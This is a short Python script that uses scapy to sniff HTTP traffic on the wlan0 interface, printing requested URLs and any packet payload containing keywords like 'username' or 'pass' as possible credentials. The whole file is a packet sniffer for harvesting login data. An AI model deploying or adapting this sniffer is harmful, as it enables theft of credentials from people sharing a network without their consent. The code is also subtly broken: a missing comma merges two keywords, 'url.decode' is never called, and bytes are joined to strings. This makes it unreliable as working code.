#!/usr/bin/env python
import scapy.all as scapy 
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 80") #type filter based on requirement .. tcp,udp,arp 

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ["username", "user", "login" "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load
                   
            #if "username" in load:
             #   print(load)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url= get_url(packet)
        print("[+] HTTP Request >> "+ url.decode)    # url.decode 

        login_info = get_login_info(packet)
        if login_info:
             print("\n\n[+] Possible username/password > " + login_info + "\n\n")

        
sniff("wlan0")    